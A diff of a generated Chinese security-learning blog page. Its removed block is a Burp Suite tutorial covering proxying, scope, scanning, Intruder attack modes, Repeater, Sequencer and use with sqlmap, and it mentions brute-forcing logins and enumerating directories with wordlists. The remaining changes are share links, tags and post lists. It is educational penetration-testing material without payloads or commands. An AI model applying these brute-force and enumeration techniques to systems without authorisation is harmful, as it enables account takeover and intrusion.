+<p><img src="/2021/11/01/burp/2-1%20%E7%AC%AC%E4%B8%80%E8%8A%82%20Burpsuite+Sqlmap%E6%B5%8B%E8%AF%95SQL%E6%B3%A8%E5%85%A5.pcwl_%E8%A7%86%E9%A2%91%E6%88%AA%E5%9B%BE_530.jpg" alt="2-1 第一节 Burpsuite+Sqlmap测试SQL注入.pcwl_视频截图_530"></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2021/11/01/SQLInject/" data-id="clfpg8ztm000dvwv51osgak8y" data-title="SQL注入" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2021/11/01/burp/" data-id="cljuunh6e000fg8v5afx52ct1" data-title="burpsuite" class="article-share-link">分享</a>
       
       
       
@@ -1439,112 +1133,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2021/11/01/fileupload/" data-id="clfpg8ztp000jvwv57mzvghh1" data-title="文件上传漏洞" class="article-share-link">分享</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-burp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/11/01/burp/" class="article-date">
-  <time class="dt-published" datetime="2021-10-31T16:00:00.000Z" itemprop="datePublished">2021-11-01</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/11/01/burp/">burpsuite</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="burpsuite"><a href="#burpsuite" class="headerlink" title="burpsuite"></a>burpsuite</h1><h2 id="proxy"><a href="#proxy" class="headerlink" title="proxy"></a>proxy</h2><h4 id="实现手机代理"><a href="#实现手机代理" class="headerlink" title="实现手机代理"></a>实现手机代理</h4><p><img src="/2021/11/01/burp/image-20211102110518594.png" alt="image-20211102110518594"></p>
-<p>按上图设施，将代理地址设置为任意地址，则将手机上网代理设置为burp主机的地址和端口就可以实现手机代理</p>
-<h4 id="对请求和响应的过滤"><a href="#对请求和响应的过滤" class="headerlink" title="对请求和响应的过滤"></a>对请求和响应的过滤</h4><p>过滤匹配是从上往下依次过滤</p>
-<p><img src="/2021/11/01/burp/image-20211102110857724.png" alt="image-20211102110857724"></p>
-<p><img src="/2021/11/01/burp/image-20211102110908183.png" alt="image-20211102110908183"></p>
-<p>and代表必须包含该匹配</p>
-<p>or代表可以包含该匹配</p>
-<h4 id="求改响应"><a href="#求改响应" class="headerlink" title="求改响应"></a>求改响应</h4><p><img src="/2021/11/01/burp/image-20211102111043915.png" alt="image-20211102111043915"></p>
-<h4 id="剔除js脚本"><a href="#剔除js脚本" class="headerlink" title="剔除js脚本"></a>剔除js脚本</h4><p>两种方法</p>
-<ul>
-<li>burp</li>
-</ul>
-<p><img src="/2021/11/01/burp/image-20211102133359955.png" alt="image-20211102133359955"></p>
-<ul>
-<li>手动F12删除js脚本</li>
-</ul>
-<h2 id="target"><a href="#target" class="headerlink" title="target"></a>target</h2><h4 id="target作用域scope介绍"><a href="#target作用域scope介绍" class="headerlink" title="target作用域scope介绍"></a>target作用域scope介绍</h4><p><img src="/2021/11/01/burp/image-20211102134023507.png" alt="image-20211102134023507"></p>
-<p>添加到scope后，会根据域名，主机名去拦截内容，也可以指定拦截一个网站的特定目录下的请求。</p>
-<h4 id="site-map"><a href="#site-map" class="headerlink" title="site map"></a>site map</h4><p><img src="/2021/11/01/burp/image-20211102134613096.png" alt="image-20211102134613096"></p>
-<p>左边显示访问的url，按网站的层级深度，树形展示整个应用系统的结构和关联其他域的url情况。</p>
-<p>右边显示url被访问的明细列表，共访问那些url，请求和应答内容。</p>
-<p>可以对代理抓取的target的网站进行分析与比对</p>
-<h2 id="spider"><a href="#spider" class="headerlink" title="spider"></a>spider</h2><p>spider设置抓取设置、抓取代理设置、表单提交设置、应用登录设置、蜘蛛引擎设置、请求消息头设置</p>
-<p><img src="/2021/11/01/burp/1-7%20Burpsuite%20%E7%88%AC%E8%99%AB%E4%BB%8B%E7%BB%8D.pcwl_%E8%A7%86%E9%A2%91%E6%88%AA%E5%9B%BE_333.jpg" alt="1-7 Burpsuite 爬虫介绍.pcwl_视频截图_333"></p>
-<p>被动抓取功能</p>
-<p>表单提交功能：自动匹配提交表单的内容</p>
-<h2 id="Scanner"><a href="#Scanner" class="headerlink" title="Scanner"></a>Scanner</h2><p>自动检测web系统的各种漏洞</p>
-<p>可以设置探测漏洞的类型，频率等<img src="/2021/11/01/burp/image-20211102143311901.png" alt="image-20211102143311901"></p>
-<p><img src="/2021/11/01/burp/image-20211102143420886.png" alt="image-20211102143420886"></p>
-<p>设定探测位置</p>
-<p><img src="/2021/11/01/burp/image-20211102143336828.png" alt="image-20211102143336828"></p>
-<p>设置静态代码分析</p>
-<p><img src="/2021/11/01/burp/image-20211102143427859.png" alt="image-20211102143427859"></p>
-<p>scanner针对主动扫描漏洞还可以出具一份漏洞报告</p>
-<h2 id="intruder"><a href="#intruder" class="headerlink" title="intruder"></a>intruder</h2><p>intruder在原始请求数据的基础上，通过修改各种请求参数，以获取不同的请求应答。每一次请求中，intruder通常会携带一个或多个有效攻击载荷，在不同的位置进行攻击重放，通过对比应答数据来分析获得需要的特征数据。</p>
-<h4 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h4><ul>
-<li>标识符枚举：web应用程序经常使用标识符来引用用户、账户、资产等数据信息</li>
-<li>提取有用的数据：在某些场景下，而不是简单地识别有效标识符，需要通过简单标识符提取一些其他的数据</li>
-<li>模糊测试：很多输入性的漏洞，如SQL注入，跨站脚本和文件路径遍历可以通过请求参数提交各种测试字符串，并分析错误消息和其他异常情况，来对应程序进行检测。</li>
-</ul>
-<h4 id="使用步骤"><a href="#使用步骤" class="headerlink" title="使用步骤"></a>使用步骤</h4><p><img src="/2021/11/01/burp/image-20211102144753635.png" alt="image-20211102144753635"></p>
-<h4 id="暴力破解用户名密码"><a href="#暴力破解用户名密码" class="headerlink" title="暴力破解用户名密码"></a>暴力破解用户名密码</h4><p>使用intruder跑字典，根据响应包的长度判断那个爆破成功</p>
-<h4 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h4><p>使用intruder跑字典，根据响应的状态码判断那个目论存在</p>
-<h4 id="Position"><a href="#Position" class="headerlink" title="Position"></a>Position</h4><p>针对HTTP某个位置或几个位置进行模糊测试，需要选择不同位置与Attack Type</p>
-<p>Attack Type：</p>
-<ul>
-<li>Sniper：狙击枪模式，只针对一个位置进行探测</li>
-<li>Battering ram：攻城锤模式，针对多个位置使用一个payload</li>
-<li>Pitchfork：单叉模式，针对多个位置使用不同的多个payload，每组payload在payload组中的位置相同。</li>
-<li>Cluster Bomb：激素炮模式，针对多个位置，全部组合</li>
-</ul>
-<h4 id="option"><a href="#option" class="headerlink" title="option"></a>option</h4><ul>
-<li>设置request请求内容</li>
-<li>Attack result设置</li>
-<li>Grep - Match设置：标出符合特定表达式的结果</li>
-<li>Grep - Exact设置：从结果中榨取有用信息</li>
-<li>Reflection设置</li>
-</ul>
-<h2 id="Repeater"><a href="#Repeater" class="headerlink" title="Repeater"></a>Repeater</h2><p>一款手工验证HTTP消息的测试工具，通常用于多次重放请求响应和手工修改请求消息的修改后对服务器端响应的消息分析</p>
-<h2 id="Sequencer"><a href="#Sequencer" class="headerlink" title="Sequencer"></a>Sequencer</h2><p>用于检测数据样本随机性质量的工具，通常用于检测访问令牌是否课预测、密码重置令牌是否可预测等场景，通过Sequencer的数据样本分析，能降低关键数据被伪造的风险</p>
-<h2 id="Decoder"><a href="#Decoder" class="headerlink" title="Decoder"></a>Decoder</h2><p>对字符串进行加解密操作</p>
-<h2 id="Comparer"><a href="#Comparer" class="headerlink" title="Comparer"></a>Comparer</h2><p>针对两个不同的HTTP请求进行比较</p>
-<h2 id="burp-sqlmap"><a href="#burp-sqlmap" class="headerlink" title="burp+sqlmap"></a>burp+sqlmap</h2><p>安装gason.jar插件</p>
-<p>安装sqlmap插件</p>
-<p><img src="/2021/11/01/burp/2-1%20%E7%AC%AC%E4%B8%80%E8%8A%82%20Burpsuite+Sqlmap%E6%B5%8B%E8%AF%95SQL%E6%B3%A8%E5%85%A5.pcwl_%E8%A7%86%E9%A2%91%E6%88%AA%E5%9B%BE_530.jpg" alt="2-1 第一节 Burpsuite+Sqlmap测试SQL注入.pcwl_视频截图_530"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2021/11/01/burp/" data-id="clfpg8ztp000lvwv5ekqeftuv" data-title="burpsuite" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2021/11/01/fileupload/" data-id="cljuunh6g000mg8v5azpkfvfy" data-title="文件上传漏洞" class="article-share-link">分享</a>
       
       
       
@@ -1648,7 +1237,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2021/11/01/sqlInject_raoguo/" data-id="clfpg8zts000vvwv5agb690qo" data-title="SQL注入绕过技巧" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2021/11/01/sqlInject_raoguo/" data-id="cljuunh6k000wg8v57e44evb5" data-title="SQL注入绕过技巧" class="article-share-link">分享</a>
       
       
       
@@ -1872,7 +1461,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2021/11/01/sqlilabs/" data-id="clfpg8ztt000zvwv52liq7x1b" data-title="sqlilabs" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2021/11/01/sqlilabs/" data-id="cljuunh6k0010g8v54ftg0nx1" data-title="sqlilabs" class="article-share-link">分享</a>
       
       
       
@@ -1904,7 +1493,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">标签</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web-security/" rel="tag">web-security</a></li></ul>
     </div>
   </div>
 
@@ -1914,7 +1503,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">标签云</h3>
     <div class="widget tagcloud">
-      <a href="/tags/web-security/" style="font-size: 10px;">web-security</a>
+      <a href="/tags/ctf/" style="font-size: 10px;">ctf</a> <a href="/tags/web-security/" style="font-size: 20px;">web-security</a>
     </div>
   </div>
 
@@ -1923,7 +1512,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">归档</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">七月 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">六月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a></li></ul>
     </div>
   </div>
 
@@ -1934,6 +1523,10 @@
     <h3 class="widget-title">最新文章</h3>
     <div class="widget">
       <ul>
+        
+          <li>
+            <a href="/2023/07/09/BUUCTF-web-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-EasySQL/">BUUCTF-web-[极客大挑战 2019]EasySQL</a>
+          </li>
         
           <li>
             <a href="/2022/06/01/%E5%8F%8D%E5%BC%B9shell/">反弹shell</a>
@@ -1949,10 +1542,6 @@
         
           <li>
             <a href="/2022/03/01/OWASP/">OWASP TOP 10</a>
-          </li>
-        
-          <li>
-            <a href="/2022/03/01/kali/">kali</a>
           </li>
         
       </ul>
